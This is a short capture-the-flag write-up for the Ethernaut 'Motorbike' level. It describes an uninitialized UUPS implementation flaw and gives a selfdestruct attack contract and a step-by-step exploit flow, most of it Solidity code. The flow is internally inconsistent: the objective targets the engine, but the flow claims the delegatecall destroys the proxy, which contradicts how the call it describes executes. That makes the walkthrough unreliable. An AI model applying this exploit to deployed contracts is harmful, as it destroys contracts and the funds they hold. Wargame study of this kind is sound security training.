# Ethernaut Level 25: Motorbike

## Objective
Destroy the Motorbike contract (selfdestruct the engine).

## Vulnerability
UUPS proxy pattern with uninitialized implementation:

```solidity
// Motorbike.sol - proxy
function initialize() external {
    require(_delegateAddress == address(0));  // Only once
    _delegateAddress = address(new Engine());
}

// Engine.sol - implementation
function initialize() external {
    require(!initialized);
    horsePower = 1000;
    initialized = true;
    upgrader = msg.sender;  // ← We can become upgrader!
}
```

## Exploit: Uninitialized Implementation

The Engine implementation contract is deployed but `initialize()` is never called on it directly. Anyone can:

1. Call `Engine.initialize()` directly on the implementation contract
2. Become `upgrader` 
3. Call `upgradeToAndCall()` with a malicious contract that selfdestruct

## Attack Contract
```solidity
contract Exploit {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
```

## Exploit Flow
```
1. Engine.initialize()  [on implementation contract]
   → upgrader = attacker
   
2. Engine.upgradeToAndCall(exploitContract, destroy())
   → delegatecall to Exploit.destroy()
   → selfdestruct(proxy)  
   → Proxy destroyed!
```

## Status: ✅ COMPLETE
**Exploit validated:** 2026-02-01T10:42Z
